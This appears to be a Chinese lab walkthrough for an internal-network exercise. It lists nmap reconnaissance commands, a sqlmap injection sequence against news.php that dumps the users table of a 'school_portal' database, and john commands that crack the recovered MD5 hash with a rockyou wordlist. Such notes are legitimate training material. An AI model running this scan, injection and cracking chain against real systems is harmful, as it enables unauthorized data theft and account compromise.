### 信息收集
	考虑到是内网无网络实验，作此内网网段信息收集扫描
```
# 主机发现
nmap -sn 192.168.100.0/24

# 端口扫描，全端口扫描，耗时较长
nmap -sS -p- 192.168.100.100

# 对目的地址进行综合扫描，包括-O系统探测，-sV版本探测，-sC脚本扫描，--traceroute，路由追踪
namp -A 192.168.100.100   

# 或者
nmap -sV -p 22,80,443 192.168.1.100

# 操作系统识别
nmap -O 192.168.100.100

# 综合性
nmap -sS -p- --min-rate 1000 192.168.100.100
nmap -sV -sC -O -p <端口列表> 192.168.100.100

# 一步到位
nmap -A -p- 192.168.100.100
```

#### 对news.php页面进行sql注入
```
# 测试能否访问到
curl 'http://192.168.100.100/news.php

# 1. 先检测是否存在注入
sqlmap -u "http://192.168.100.100/news.php?id=1" --batch

# 2. 如果检测到，获取数据库
sqlmap -u "http://192.168.100.100/news.php?id=1" --dbs --batch

# 3. 获取school_portal数据库的表单信息
sqlmap -u "http://192.168.100.100/news.php?id=1" -D school_portal --tables --batch

# 4. 获取users表的信息 得到一串加密信息，用john爆破
sqlmap -u "http://192.168.100.100/news.php?id=1" -D school_portal -T users --dump --batch

# 5. joho爆破
# 保存 MD5 到文件
echo "0192023a7bbd73250516f069df18b500" > hash.txt

# 使用 john 破解（默认字典）
john --format=raw-md5 hash.txt

# 使用 rockyou 字典
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 查看结果
john --show hash.txt
```
